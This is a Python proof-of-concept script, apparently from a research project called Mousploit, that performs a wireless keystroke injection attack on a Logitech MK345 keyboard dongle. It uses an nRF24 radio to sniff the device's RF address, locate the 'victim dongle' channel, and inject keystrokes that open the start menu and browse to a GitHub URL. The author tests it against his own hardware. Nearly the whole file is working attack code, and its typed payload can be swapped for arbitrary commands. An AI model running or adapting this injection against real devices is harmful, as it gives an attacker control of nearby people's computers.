import time
import sys
from os.path import dirname

'''
Appending the project root folder to sys.path so that we can import modules from other directories (radio_agent for example).
Simply using a relative import such as: from ..radio_agent import nrf24, would NOT work since any script that uses
explicit relative imports cannot be run directly, but this is a script we want to run.
To reach the path of the project root in a general way (regardless of the current working directory), we use the __file__ variable
which stores the full path of this file, then call os.path.dirname twice to get only the path of the parent of the tests directory.
To be fully confident, we also have a launch.json file that assigns the workspace folder as the value of the PYTHONPATH environment variable,
making sure everything can run smoothly within VS Code as well.
'''
sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.general_utils import *

def main():
    # E4:ED:AE:B8:B4 is an RF address of a Logitech MK345 keyboard that I (Ron) own.
    # It MUST be written backwards, because when it's sent to the attacking dongle (by calling enter_sniffer_mode), it is written to some register
    # in the nRF24 chip using an SPI command. This can be deduced by following the flow of function calls in the research firmware code, starting here:
    # https://github.com/BastilleResearch/nrf-research-firmware/blob/master/src/radio.c#L98
    # According to page 53 here: https://www.rcscomponents.kiev.ua/datasheets/nrf24lu1-f16q32-t.pdf, data bytes in SPI commands must be ordered from LSByte to MSByte.
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4]
    #address = [0xA4, 0x35, 0xE3, 0x7C, 0x81] 81:7C:E3:35:A4 # Birman mouse
    #address = [0xA4, 0x0C, 0xA8, 0xAB, 0xFA] # FA:AB:A8:0C:A4 is an RF address of a Logitech MK345 mouse that I (Ron) own

    # initialize the radio
    radio = nrf24.nrf24()

    radio.enter_sniffer_mode(address)
    channel = find_frequency_channel(radio)
    if not channel:
        print("Failed to find frequency channel. Try to get closer to the victim dongle.")
        sys.exit(1)

    # transmit_string(radio, "1123456789")

    # using the search bar of the start menu to open the browser on some URL
    transmit_keys(radio, ['WINDOWS']) # open the start menu
    transmit_string(radio, 'www.github.com/avivk9/Mousploit')
    time.sleep(0.75) # otherwise the Enter keystroke will not be effective, because it takes a moment for the start menu to refresh
    transmit_keys(radio, ['ENTER'])

if __name__ == "__main__":
    main()
